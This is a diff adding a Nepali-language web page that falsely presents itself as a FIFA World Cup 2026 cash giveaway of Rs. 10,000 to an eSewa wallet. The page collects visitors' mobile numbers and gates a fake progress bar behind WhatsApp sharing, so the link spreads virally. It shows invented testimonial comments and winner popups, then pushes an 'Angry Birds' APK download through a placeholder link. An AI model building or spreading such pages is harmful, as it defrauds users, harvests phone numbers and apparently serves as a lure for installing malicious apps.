@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <meta property="og:title" content="⚽ FIFA World Cup 2026 को अवसर मा रकम रु. १०,०००/- जितने मौका' छुट्ला है।*" />
+    <meta property="og:description" content="FIFA World Cup 2026, को अवसर मा प्रत्येक हप्ता ७ जन्ना ब्यक्तिले पाऊनु हुने छ।" />
+    <meta property="og:image" content="https://i.imgur.com/O69hwUQ.jpeg" />
+    <meta property="og:url" content="https://fifa-rewards.netlify.app/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="FIFA World Cup 2026" />
+    <meta property="og:updated_time" content="1781665954" />
+
+    <title>FIFA World Cup 2026</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { -webkit-tap-highlight-color: transparent; -webkit-touch-callout: none; -webkit-user-select: none; user-select: none; }
+        html, body { margin: 0; padding: 0; width: 100%; overflow-x: hidden; min-height: 100vh; display: flex; flex-direction: column; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .video-container { width: 100%; position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; }
+        .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
+        .content { flex: 1; }
+        .popup-ad { position: fixed; top: -100px; left: 0; width: 100%; background: linear-gradient(to right, #008000, #000000); color: #ffffff; padding: 15px; text-align: center; box-sizing: border-box; font-weight: bold; font-size: 13px; transition: top 0.8s ease-in-out; z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.5); }
+        .gradient-bar, .footer-bar { width: 100%; background: linear-gradient(to right, #008000, #000000); color: #ffffff; padding: 15px; text-align: center; box-sizing: border-box; }
+        .gradient-bar { font-weight: 600; letter-spacing: 0.5px; font-size: 15.05px; text-shadow: 1px 1px 2px rgba(0,0,0,0.3); }
+        .footer-bar { font-size: 12px; font-weight: bold; }
+        .comments-module { width: 100%; padding: 15px; box-sizing: border-box; background: white; margin-top: 20px; }
+        .bar { display: flex; justify-content: space-around; border-top: 1px solid #eee; border-bottom: 1px solid #eee; padding: 10px 0; margin-bottom: 15px; }
+        .react-wrapper { display: flex; flex-direction: column; align-items: center; cursor: pointer; color: #555; }
+        .like-container { display: flex; align-items: center; }
+        .reaction-icons { display: flex; align-items: center; margin-right: 5px; }
+        .reaction-icons img { width: 14px; height: 14px; border-radius: 50%; border: 1px solid white; margin-left: -4px; }
+        .stat-text { font-weight: bold; font-size: 12px; margin-bottom: 4px; color: #555; }
+        #comment-list { max-height: 300px; overflow-y: auto; overflow-x: hidden; padding-bottom: 10px; margin-bottom: 10px; border-bottom: 1px solid #e0e0e0; padding-right: 15px; }
+        #comment-list::-webkit-scrollbar { width: 4px; }
+        #comment-list::-webkit-scrollbar-track { background: transparent; }
+        #comment-list::-webkit-scrollbar-thumb { background: #ccc; border-radius: 2px; }
+        .comment { display: flex; margin-bottom: 10px; }
+        .comment img { width: 30px; height: 30px; border-radius: 50%; margin-right: 8px; object-fit: cover; flex-shrink: 0; }
+        .single-container { background: #f2f3f5; padding: 8px; border-radius: 15px; font-size: 13px; display: inline-block; max-width: 85%; word-wrap: break-word; }
+        .comment-text { display: block; margin-top: 5px; }
+        .user { font-weight: bold; display: block; }
+        .input { margin-top: 10px; display: flex; gap: 10px; align-items: center; }
+        .input input { flex: 1; padding: 8px; border: 1px solid #ccc; border-radius: 15px; box-sizing: border-box; }
+        .input button { background: none; border: none; padding: 5px; cursor: pointer; font-size: 18px; color: #555; transition: color 0.2s; }
+        .blue-icon { color: #008000 !important; }
+        .liked { color: #008000 !important; }
+        .button-container { padding: 0 0 15px 0; text-align: center; }
+        .info-text { font-size: 14px; font-weight: bold; color: #333; margin-top: 5px; margin-bottom: 10px; display: block; line-height: 1.2; }
+        .extra-text { font-size: 18px; font-weight: 800; background: linear-gradient(to right, #008000, #000000); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0px; margin-top: -20px; display: block; }
+        .action-button { background: linear-gradient(to right, #008000, #000000); color: white; padding: 12px 25px; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        @media (min-width: 768px) { .gradient-bar, .footer-bar { padding: 20px; } .gradient-bar { font-size: 25px; } .footer-bar { font-size: 14px; } .popup-ad { font-size: 25px; } .extra-text { font-size: 23px; } }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; z-index: 2000; justify-content: center; align-items: center; }
+        .card { background: white; padding: 20px; border-radius: 15px; width: 85%; max-width: 400px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.3); position: relative; }
+        .notice-header-gradient { background: linear-gradient(to right, #008000, #000000); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold; font-size: 16px; margin: 0 0 10px 0; }
+        .close-btn { position: absolute; top: 10px; right: 15px; font-size: 24px; cursor: pointer; color: #555; }
+        #loading-wrapper { display: none; margin-top: 10px; }
+        #progress-bar { width: 100%; background: #eee; height: 10px; border-radius: 5px; }
+        #progress-fill { width: 0%; height: 100%; background: #008000; border-radius: 5px; }
+        .number-box { display: none; margin-top: 15px; }
+        #phone-input { width: 100%; padding: 15px; border: 2px solid #000000; border-radius: 12px; font-size: 18px; font-weight: bold; box-sizing: border-box; text-align: center; color: #333; transition: border-color 0.3s ease; }
+        #phone-input:focus { border-color: #008000; outline: none; box-shadow: 0 0 8px rgba(0,128,0,0.3); }
+        .btn-continue { display: none; margin-top: 15px; background: linear-gradient(to right, #008000, #000000); color: white; padding: 14px; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        
+        .whatsapp-btn { display: none; background: #25d366; color: white; padding: 14px; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; margin-top: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        #congratulations-box { display: none; text-align: left; margin-top: 15px; font-size: 14px; color: #000000; line-height: 1.5; }
+        .display-number-gradient { font-weight: bold; background: linear-gradient(to right, #008000, #000000); -webkit-background-clip: text; -webkit-text-fill-color: transparent; display: inline-block; font-size: 16px; }
+        #apk-banner { display: none; width: 100%; border-radius: 12px; margin-top: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        #apk-instruction { display: none; font-weight: bold; text-align: center; color: #000000; margin-top: 15px; font-size: 14px; line-height: 1.4; }
+    </style>
+</head>
+<body>
+    <div class="overlay" id="myCard">
+        <div class="card">
+            <span class="close-btn" onclick="closePopupAndLoad()">&times;</span>
+            <p class="notice-header-gradient">सुचना:</p>
+            <p style="font-weight: bold; font-size: 14px;">तपाईंको रकम प्रक्रिया चाँडै सुरु गरिनेछ ।</p>
+            <p style="font-size: 14px; color: #555;">कृपया कुनै पनि अनौपचारिक कल, SMS, वा इमेलमा आफ्नो गोप्य जानकारी "जस्तै OTP, PIN, bank विवरण:" साझा नगर्नुहोस्।<br>FIFA ले तपाईंलाई यस्तो जानकारी कहिल्यै सोध्दैन ।</p>
+        </div>
+    </div>
+    <div class="popup-ad" id="popup"></div>
+    
+    <div class="video-container">
+        <iframe src="https://streamable.com/e/j19q2x?autoplay=1&mute=1&controls=0" allow="autoplay; fullscreen" style="border:none; width:100%; height:100%; position:absolute; left:0px; top:0px; overflow:hidden;"></iframe>
+    </div>
+    
+    <div class="content">
+        <div class="gradient-bar">रकम रु. १०,०००/- जितने मौका छुट्ला है।</div>
+        <div class="comments-module">
+            <div class="button-container">
+                <span class="extra-text">रु. १०,०००/-</span>
+                <span class="info-text">FIFA World Cup 2026, को अवसर मा प्रत्येक हप्ता ७ जन्ना ब्यक्तिले पाऊनु हुने छ।</span>
+                <button id="action-btn" class="action-button" onclick="document.getElementById('myCard').style.display='flex'">रकम प्राप्त गर्नु होस्।</button>
+                
+                <div id="loading-wrapper">
+                    <p id="loading-text" style="font-weight:bold; font-size:14px;">0% Loading...</p>
+                    <div id="progress-bar"><div id="progress-fill"></div></div>
+                    
+                    <div id="congratulations-box">
+                        <p style="text-align: center; font-size: 16px; color: #000000;"><b>मोबाइल नम्बर:</b> "<span id="display-phone" class="display-number-gradient"></span>"</p>
+                        
+                        <button class="whatsapp-btn" id="whatsapp-btn" onclick="shareOnWhatsApp()">WhatsApp मा शेयर गर्नु होस्।</button>
+                        
+                        <img id="apk-banner" src="https://i.imgur.com/bf2x3tg.jpeg" alt="Banner">
+                        
+                        <button class="whatsapp-btn" id="apk-btn" onclick="downloadApk()" style="display: none; background: linear-gradient(to right, #008000, #000000);">Angry Birds:- Download गर्नु होस्।</button>
+                        
+                        <p id="apk-instruction">Angry Birds "Game" Download गर्नु होस् र  "Install" गरि ५ मिनेट सम्म खेल्नु होस्।</p>
+                        
+                        <p style="color:green; font-weight:bold; margin-top:15px;">बधाई छ!</p>
+                        <p>तपाईं <b>FIFA World Cup 2026</b> तर्फ बाट विशेष रकम <b>रु. १०,०००/-</b> प्राप्त गर्न योग्य हुनुभएको छ।</p>
+                        <p style="font-weight:bold;">"आफ्नो रकम <b>रु. १०,०००/-</b> कसरी प्राप्त गर्ने?"</p>
+                        <p>१. माथि रहेको <b>WhatsApp</b> बटन प्रयोग गरी, यो पेज <b>५ वटा</b> समूह वा <b>१० जना</b> साथीहरू सँग <b>शेयर</b> गर्नुहोस्।</p>
+                        <p>२. <b style="color: #000000;">100%</b> Loading..."बार" पूरा भएपछि, <b style="color: #000000;">२४ घन्टा</b> भित्र रकम <b>रु. १०,०००/-</b> तपाईंको mobile नम्बरमा रहेको <b style="color: #000000;">"Esewa Wallet"</b> मा <b>स्वतः सक्रिय हुनेछ।</b></p>
+                        <p>३. आफ्नो रकम <b>रु. १०,०००/-</b> प्रयोग गर्नुहोस् र आफ्ना प्रियजनहरू सँग रमाउनु होस!</p>
+                        <p><b>धन्यवाद।</b></p>
+                    </div>
+
+                    <div class="number-box" id="number-box">
+                        <input type="text" id="phone-input" value="+977" maxlength="14" placeholder="Enter 10 Digit Valid Number" oninput="validatePhone(this)">
+                        <p style="font-size: 12px; color: #555; margin-top: 8px; font-weight: 600;">कृपया १० अंकको मोबाइल नम्बर प्रविष्ट गर्नुहोस्</p>
+                        <button class="btn-continue" id="continue-btn" onclick="continueLoading()">Continue</button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bar">
+                <div class="react-wrapper" onclick="toggleLike(this)">
+                    <div class="like-container">
+                        <div class="reaction-icons"><img src="https://i.imgur.com/9ljOueT.jpeg"><img src="https://i.imgur.com/Ns7wdyx.jpeg"><img src="https://i.imgur.com/lOQO5Tv.jpeg"></div>
+                        <span class="stat-text" style="margin-bottom:0;">143K</span>
+                    </div>
+                    <span id="like-text" style="margin-top:2px;"><i class="fa fa-thumbs-up"></i> मन पर्‍यो</span>
+                </div>
+                <div class="react-wrapper"><span class="stat-text">23K</span><span><i class="fa fa-comment"></i> कमेन्ट</span></div>
+                <div class="react-wrapper"><span class="stat-text">12K</span><span><i class="fa fa-share"></i> शेयर</span></div>
+            </div>
+            <div id="comment-list">
+                <div class="comment"><img src="https://i.imgur.com/9ljOueT.jpeg"><div class="single-container"><span class="user">सिता शर्मा</span><span>सुरुमा अलि शंका लागेको थियो, तर साँच्चै प्रयोग गर्न मिल्ने रहेछ। 🙏🥰</span></div></div>
+                <div class="comment"><img src="https://i.imgur.com/Ns7wdyx.jpeg"><div class="single-container"><span class="user">Anita Thapa</span><span>मैले प्रयास गरें, रु.१०,०००/- सक्रिय भयो। 👍</span></div></div>
+                <div class="comment"><img src="https://i.imgur.com/R20XW6F.jpeg"><div class="single-container"><span class="user">रमेश कार्की</span><span>राम्रै रहेछ, थप रु.५,०००/- पाएँ। 😂❣️</span></div></div>
+                <div class="comment"><img src="https://i.imgur.com/lOQO5Tv.jpeg"><div class="single-container"><span class="user">बिकाश गुरुङ</span><span>दैनिक कामका लागि धेरै सहयोगी भयो, धन्यवाद। ❤️</span></div></div>
+            </div>
+            <div class="input">
+                <input type="text" id="comment-input" placeholder="कमेन्ट लेख्नुहोस् ...">
+                <button id="post-btn"><i class="fa fa-paper-plane"></i></button>
+            </div>
+        </div>
+    </div>
+    <div class="footer-bar">Copyright © 1994 - 2026 FIFA. All rights reserved.</div>
+
+    <script>
+        let currentWidth = 0;
+        let userNumber = "";
+        let whatsappClickCount = 0;
+        let apkLoadingStarted = false;
+
+        function closePopupAndLoad() {
+            document.getElementById('myCard').style.display = 'none';
+            document.getElementById('action-btn').style.display = 'none';
+            document.getElementById('loading-wrapper').style.display = 'block';
+            runLoading(33);
+        }
+
+        function runLoading(target) {
+            const fill = document.getElementById('progress-fill');
+            const text = document.getElementById('loading-text');
+            const interval = setInterval(() => {
+                if (currentWidth >= target) {
+                    clearInterval(interval);
+                    if (target === 33) document.getElementById('number-box').style.display = 'block';
+                    if (target === 67) {
+                        document.getElementById('congratulations-box').style.display = 'block';
+                        document.getElementById('display-phone').innerText = userNumber;
+                        
+                        if (currentWidth >= 83) {
+                            document.getElementById('whatsapp-btn').style.display = 'none';
+                            document.getElementById('apk-banner').style.display = 'block';
+                            document.getElementById('apk-btn').style.display = 'block';
+                            document.getElementById('apk-instruction').style.display = 'block';
+                        } else {
+                            document.getElementById('whatsapp-btn').style.display = 'block';
+                        }
+
+                        localStorage.setItem('currentWidth', currentWidth);
+                        localStorage.setItem('whatsappClickCount', whatsappClickCount);
+                    }
+                } else {
+                    currentWidth++;
+                    fill.style.width = currentWidth + "%";
+                    text.innerText = currentWidth + "% Loading...";
+                }
+            }, 50);
+        }
+
+        function continueLoading() {
+            userNumber = document.getElementById('phone-input').value;
+            localStorage.setItem('userNumber', userNumber);
+            document.getElementById('number-box').style.display = 'none';
+            runLoading(67);
+        }
+
+        function autoLoadTo83() {
+            let autoInterval = setInterval(() => {
+                if (currentWidth >= 83) {
+                    clearInterval(autoInterval);
+                    document.getElementById('whatsapp-btn').style.display = 'none';
+                    document.getElementById('apk-banner').style.display = 'block';
+                    document.getElementById('apk-btn').style.display = 'block';
+                    document.getElementById('apk-instruction').style.display = 'block';
+                    localStorage.setItem('currentWidth', currentWidth);
+                } else {
+                    currentWidth++;
+                    document.getElementById('progress-fill').style.width = currentWidth + "%";
+                    document.getElementById('loading-text').innerText = currentWidth + "% Loading...";
+                    localStorage.setItem('currentWidth', currentWidth);
+                }
+            }, 150);
+        }
+
+        function shareOnWhatsApp() {
+            const msg = encodeURIComponent("*तपाईं FIFA World Cup 2026 तर्फ बाट विशेष रकम रु.१०,०००/- प्राप्त गर्न योग्य हुनुभएको छ।*\n*https://FIFA-Rewards.NetLify.App/*");
+            
+            if (currentWidth < 70) {
+                currentWidth++;
+                whatsappClickCount++;
+                
+                localStorage.setItem('currentWidth', currentWidth);
+                localStorage.setItem('whatsappClickCount', whatsappClickCount);
+                
+                document.getElementById('progress-fill').style.width = currentWidth + "%";
+                document.getElementById('loading-text').innerText = currentWidth + "% Loading...";
+                
+                if (currentWidth === 70) {
+                    autoLoadTo83();
+                }
+            }
+
+            window.open("https://wa.me/?text=" + msg, '_blank');
+        }
+
+        function downloadApk() {
+            window.open("YOUR_GITHUB_LINK_HERE", "_self"); 
+
+            if (apkLoadingStarted || currentWidth >= 99) {
+                return;
+            }
+
+            apkLoadingStarted = true; 
+            
+            const btn = document.getElementById('apk-btn');
+            if (btn) {
+                btn.style.pointerEvents = 'none';
+                btn.disabled = true;
+            }
+
+            let apkInterval = setInterval(() => {
+                if (currentWidth >= 99) {
+                    clearInterval(apkInterval);
+                    currentWidth = 99; 
+                    document.getElementById('progress-fill').style.width = "99%";
+                    document.getElementById('loading-text').innerText = "99% Loading...";
+                    localStorage.setItem('currentWidth', currentWidth);
+                } else {
+                    currentWidth++;
+                    document.getElementById('progress-fill').style.width = currentWidth + "%";
+                    document.getElementById('loading-text').innerText = currentWidth + "% Loading...";
+                    localStorage.setItem('currentWidth', currentWidth);
+                }
+            }, 80); 
+        }
+
+        function validatePhone(input) {
+            if (!input.value.startsWith('+977')) {
+                input.value = '+977';
+            }
+            let val = input.value;
+            let numPart = val.replace('+977', '');
+            if (!/^\d*$/.test(numPart)) {
+                input.value = '+977' + numPart.replace(/\D/g, '');
+            }
+            if (numPart.length > 10) {
+                input.value = '+977' + numPart.substring(0, 10);
+            }
+            document.getElementById('continue-btn').style.display = (numPart.length === 10) ? 'block' : 'none';
+        }
+
+        const messages = ["सिता शर्मा, तपाईंले रकम रु. १०,०००/- जितनु भएकोमा बधाई छ।", "रमेश कार्की, तपाईंले रकम रु. १०,०००/- जितनु भएकोमा बधाई छ।"];
+        function showPopup() {
+            const popup = document.getElementById('popup');
+            const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+            popup.innerText = randomMsg;
+            popup.style.top = "0";
+            setTimeout(() => { popup.style.top = "-100px"; }, 4000);
+        }
+        
+        window.onload = function() {
+            setTimeout(showPopup, 2000);
+            setInterval(showPopup, 8000);
+
+            if (localStorage.getItem('currentWidth')) {
+                let savedWidth = parseInt(localStorage.getItem('currentWidth'));
+                if (savedWidth >= 67) {
+                    currentWidth = savedWidth;
+                    whatsappClickCount = parseInt(localStorage.getItem('whatsappClickCount')) || 0;
+                    userNumber = localStorage.getItem('userNumber') || "";
+
+                    document.getElementById('action-btn').style.display = 'none';
+                    document.getElementById('loading-wrapper').style.display = 'block';
+                    document.getElementById('congratulations-box').style.display = 'block';
+                    document.getElementById('display-phone').innerText = userNumber;
+                    
+                    document.getElementById('progress-fill').style.width = currentWidth + "%";
+                    document.getElementById('loading-text').innerText = currentWidth + "% Loading...";
+
+                    if (currentWidth >= 83) {
+                        document.getElementById('whatsapp-btn').style.display = 'none';
+                        document.getElementById('apk-banner').style.display = 'block';
+                        document.getElementById('apk-btn').style.display = 'block';
+                        document.getElementById('apk-instruction').style.display = 'block';
+
+                        if (currentWidth >= 84 && currentWidth < 99) {
+                            apkLoadingStarted = true;
+                            const btn = document.getElementById('apk-btn');
+                            if (btn) btn.style.pointerEvents = 'none';
+                            
+                            let apkInterval = setInterval(() => {
+                                if (currentWidth >= 99) {
+                                    clearInterval(apkInterval);
+                                    currentWidth = 99;
+                                    document.getElementById('progress-fill').style.width = "99%";
+                                    document.getElementById('loading-text').innerText = "99% Loading...";
+                                    localStorage.setItem('currentWidth', currentWidth);
+                                } else {
+                                    currentWidth++;
+                                    document.getElementById('progress-fill').style.width = currentWidth + "%";
+                                    document.getElementById('loading-text').innerText = currentWidth + "% Loading...";
+                                    localStorage.setItem('currentWidth', currentWidth);
+                                }
+                            }, 80);
+                        }
+                    } else {
+                        document.getElementById('whatsapp-btn').style.display = 'block';
+                        if (currentWidth >= 70) {
+                            autoLoadTo83();
+                        }
+                    }
+                }
+            }
+        };
+
+        function toggleLike(element) {
+            const span = element.querySelector('#like-text');
+            span.classList.toggle('liked');
+            element.style.color = span.classList.contains('liked') ? '#008000' : '#555';
+        }
+        const inputField = document.getElementById('comment-input');
+        const commentList = document.getElementById('comment-list');
+        const postBtn = document.getElementById('post-btn');
+        const planeIcon = postBtn.querySelector('i');
+        inputField.addEventListener('input', function() { planeIcon.classList.toggle('blue-icon', inputField.value.trim() !== ""); });
+        function addComment() {
+            const commentText = inputField.value.trim();
+            if (commentText !== "") {
+                const newComment = document.createElement('div');
+                newComment.className = 'comment';
+                newComment.innerHTML = `<img src="https://i.imgur.com/iBbtGrd.jpeg"><div class="single-container"><span class="user">नयाँ प्रयोगकर्ता</span><span>${commentText}</span></div>`;
+                commentList.appendChild(newComment);
+                inputField.value = '';
+                planeIcon.classList.remove('blue-icon');
+                commentList.scrollTop = commentList.scrollHeight;
+            }
+        }
+        postBtn.addEventListener('click', addComment);
+        inputField.addEventListener('keypress', (e) => { if (e.key === 'Enter') addComment(); });
+    </script>
+</body>
+</html>
